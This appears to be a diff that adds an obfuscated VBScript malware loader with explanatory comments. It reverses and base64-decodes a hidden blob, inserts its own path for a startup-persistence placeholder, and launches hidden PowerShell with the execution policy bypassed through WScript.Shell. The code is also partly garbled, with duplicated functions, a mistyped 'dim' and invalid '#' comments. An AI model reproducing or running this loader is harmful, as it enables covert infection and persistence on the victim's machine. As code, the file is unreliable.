@@ -1,0 +1,106 @@
+dim TqIp
+TqIp = "  "
+dim hGvL
+hGvL = "/ ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ /"
+dim AaSS
+
+AaSS = WDQy(=AQKAkCAgAwJAMHA0Bw & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & AMHApBwbAcEAnAAIAwCAgAQeAAHAvBwQAEGAkBwbAIFAkAAIAwCAgAwJAgGA0BAdAAHAzBgOA8CAvAAcAEGAzBAdA☈☈☈GApBwbA4CAjBwbA0GAvAA & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & A8GA3BgbAwGAvBQYAQGAvAAeAgFA3BwRA☈☈☈HAyAwVAgGAEBgMAcGAtBwJAgCAgAQXA0FAbBAdAMGAlBgaAIGAvBwWAACAsAAbAwGA1BgbAQCAoAQ & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & AsGAvBgdA4GAJBgLAkCAnAgYAIGAEBQaAMFAzBARA☈☈☈FAnAAKAQGAvBAaAQHAlBQTAQHAlBwRA4CApAwJAcGAVBgeA0GA5BAbAcEAVBgLAoFAOBQdAsGALBgdAsEA4BwJAgCAlBAcAkHA☈☈☈BAdA☈☈☈GAHBgLAkCAMBATAQEAkAAKAQGAhBwbAwEAuAgbAkGAhBQbA8GAEBAdA4GAlBgcAIHA1BwQAoDA6AQXA4GApBQYA0GAvBARAAHAwBQQA4CAtBQ & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & AQHAzBQeAMFAbBwOAkCApAwJAQHA4BAdA4CAsBAbAQEAhBA & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & A8GASBwLAwGAsBARA8CA0BwcA☈☈☈GA1BQcA4CAzBAcAcHAvAwLAoDAzBAcAQHA0BAaAcCAoAw & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & A4GApBgcAQHATBA & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & AEGAvBAbA4GA3BwbAQEAuAQKAQHAuBQ & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &    & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & AkGAsBwQAIGAlBwVA4CA0BQ & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & A4EAgAAdAMGAlBgaAIGAPBQLAcHAlBgTAgCAoAw & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & A4GApBgcAQHATBANAYDAlBwcAEGACBQbA8GAyBgRAoDA6AQXAQHAyBQ & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &    & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & AYHAuBwbAMEAuAQbA☈☈☈GA0BwcAkHATBwWAACA9AAIAwEAMBARAQCAgAQXA0FAbBQ & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &    & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & AQHA5BgQAsFA7AwJA☈☈☈CAhBA & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & A8GASBAcA☈☈☈HA0BgcAEGA0Bw☈☈☈AkHAwBwbAMEAlAwJAACA9AAIAkHAwBwbAMEAhBA & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / &  & / ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ / & A8GASBAJ)
+
+	#This function does a string reverse on anything that is passed to it, 1 option being passed to the function
+	Function WDQy(KxUL)
+		dim erLL
+		erLL = "WDQy = "
+		erLL = erLL + "SLhDitrLhDiRevLhDierse"
+		erLL = qUOt(erLL,"LhDi","")
+
+			#This function is doing a string replace on the text that is passed to it, 3 options being passed to the function
+			Function qUOt(KxUL,PmPg,llXf)
+				dim erLL
+				erLL = "qUOt = "
+				erLL = erLL + "Replace"
+				erLL = erLL + "(KxUL ,PmPg, llXf)"
+				execute(erLL) ---> Basically var 'erLL' with REPLACE with the 3 options that were passed to this function are what gets removed. See https://www.tutorialspoint.com/vbscript/vbscript_replace_function.htm for examples of the REPLACE function.
+			End Function
+		
+		erLL = erLL + "(KxUL)"
+		execute(erLL)
+	End Function
+
+AaSS = qUOt( AaSS, hGvL + TqIp + hGvL , "Z")
+	
+	#This function does a string reverse on anything that is passed to it, 1 option being passed to the function
+	Function WDQy(KxUL)
+		dim erLL
+		erLL = "WDQy = "
+		erLL = erLL + "SLhDitrLhDiRevLhDierse"
+		erLL = qUOt(erLL,"LhDi","")
+
+			#This function is doing a string replace on the text that is passed to it, 3 options being passed to the function
+			Function qUOt(KxUL,PmPg,llXf)
+				dim erLL
+				erLL = "qUOt = "
+				erLL = erLL + "Replace"
+				erLL = erLL + "(KxUL ,PmPg, llXf)"
+				execute(erLL)
+	End Function
+		
+		erLL = erLL + "(KxUL)"
+		execute(erLL)
+	End Function
+
+
+di ytwZ
+
+ytwZ = WDQy("' = mqUi$") & AaSS & "'" 
+	
+	#This function does a string reverse on anything that is passed to it, 1 option being passed to the function
+	Function WDQy(KxUL)
+		dim erLL
+		erLL = "WDQy = "
+		erLL = erLL + "SLhDitrLhDiRevLhDierse"
+		erLL = qUOt(erLL,"LhDi","")
+
+			#This function is doing a string replace on the text that is passed to it, 3 options being passed to the function
+			Function qUOt(KxUL,PmPg,llXf)
+				dim erLL
+				erLL = "qUOt = "
+				erLL = erLL + "Replace"
+				erLL = erLL + "(KxUL ,PmPg, llXf)"
+				execute(erLL)
+			End Function
+		
+		erLL = erLL + "(KxUL)"
+		execute(erLL)
+	End Function
+
+
+ytwZ = ytwZ & ";$OWjuxD = [System.Text.Encoding]::Unicode.GetString( "
+ytwZ = ytwZ & "[System.Convert]::FromBase64String( $iUqm.replace('☈☈☈','U') ) )"
+
+ytwZ = ytwZ & qUOt( ";$OWjuxD = $OWjuxD.replace('%CopyStartupRoda%', '" & WScript.ScriptFullName & "');po;wers;hell.;exe -windo;wstyle hi;dden -Execut;ionPolicy Byp;ss -NoP;rofile -Com;mand $OW;juxD" & "WDySjnçIJwGnYGadvbOQBvKzlNzWDDgUqgGlLKÇQvvkKPNjaUIdApxgqHTfDLUkfOKsXOKçDcQtltyXDXhNNbGNNPACgAzWRtuLt" , "WDySjnçIJwGnYGadvbOQBvKzlNzWDDgUqgGlLKÇQvvkKPNjaUIdApxgqHTfDLUkfOKsXOKçDcQtltyXDXhNNbGNNPACgAzWRtuLt", "")
+
+	#This function is doing a string replace on the text that is passed to it, 3 options being passed to the function
+	Function qUOt(KxUL,PmPg,llXf)
+		dim erLL
+		erLL = "qUOt = "
+		erLL = erLL + "Replace"
+		erLL = erLL + "(KxUL ,PmPg, llXf)"
+		execute(erLL)
+	End Function
+
+dim erPm
+erPm = ""
+ytwZ = ( qUOt(ytwZ, erPm + ";" + erPm, "") ) 
+
+	#This function is doing a string replace on the text that is passed to it, 3 options being passed to the function
+	Function qUOt(KxUL,PmPg,llXf)
+		dim erLL
+		erLL = "qUOt = "
+		erLL = erLL + "Replace"
+		erLL = erLL + "(KxUL ,PmPg, llXf)"
+		execute(erLL)
+	End Function
+
+set GMUi =  CreateObject("WScript.Shell")
+GMUi.Run( "powershell -command " & (ytwZ) ), 0, false
+
